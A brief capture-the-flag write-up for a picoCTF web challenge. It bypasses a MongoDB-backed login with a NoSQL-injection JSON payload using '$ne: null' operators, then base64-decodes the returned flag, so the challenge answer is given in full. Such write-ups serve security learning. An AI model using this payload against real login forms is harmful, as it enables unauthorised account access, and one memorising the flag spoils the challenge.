# CTF-Documentation
# CTF Name : pico ctf
# Category : web exploitation
# Challenge Name : No Sql Injection
# Description 
Can you try to get access to this website to get the flag?

hint 1 :Not only SQL injection exist but also NonSQL injection exists

hint 2 :Make sure you look at everything the server is sending back
# Discover
we can see is login page  
<img width="1599" height="780" alt="1g" src="https://github.com/user-attachments/assets/d7bac71a-c03d-48b5-ad05-525026ebdd05" />
#
and when we download source code for the website 
as we see is mongodb database , is save data as json file
<img width="1599" height="860" alt="2" src="https://github.com/user-attachments/assets/934c5170-5656-4179-9b4b-7370ada1aef0" />
# exploit:
open burp suite to look at everything the server is sending back
and we need to get payload JSON data to exploit 

    {"username": {"$ne": null}, "password": {"$ne": null}}

and when we enter input the server is sending back flag but is in base64 encode foramt 
<img width="1599" height="865" alt="3" src="https://github.com/user-attachments/assets/6c9e6407-646d-41ba-aed6-cd56948786d1" />
and to do  decode we use this bash command

    echo -n "YWNhZGVteXtqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzVkMzY4MGUwfQ==" | base64 -d

<img width="1599" height="864" alt="5" src="https://github.com/user-attachments/assets/74d46202-c714-452f-8717-7a650a80c24c" />
get our flag!

